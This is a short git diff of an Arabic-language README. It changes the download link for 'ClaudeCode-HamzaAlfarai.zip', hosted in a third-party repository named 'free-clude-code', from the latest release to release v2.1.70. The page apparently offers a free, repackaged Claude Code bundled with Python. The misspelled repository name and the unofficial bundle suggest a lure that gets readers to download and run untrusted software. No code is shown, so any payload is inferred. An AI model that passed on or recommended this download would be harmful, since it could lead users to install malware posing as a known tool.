@@ -8,9 +8,9 @@
 
 ## ⬇️ التحميل
 
-حمّل الحزمة كاملة (البرنامج + **أحدث إصدار من Python**) في ملف مضغوط واحد من صفحة **Releases**:
+حمّل الحزمة كاملة (البرنامج + **أحدث إصدار من Python**) في ملف مضغوط واحد من صفحة **[Releases — v2.1.70](https://github.com/hamza756-pory/free-clude-code/releases/tag/v2.1.70)**:
 
-### 👉 [ClaudeCode-HamzaAlfarai.zip](https://github.com/hamza756-pory/free-clude-code/releases/latest/download/ClaudeCode-HamzaAlfarai.zip)
+### 👉 [ClaudeCode-HamzaAlfarai.zip](https://github.com/hamza756-pory/free-clude-code/releases/download/v2.1.70/ClaudeCode-HamzaAlfarai.zip)
 
 فك الضغط في أي مجلد، ثم اتبع الخطوات بالأسفل.
 
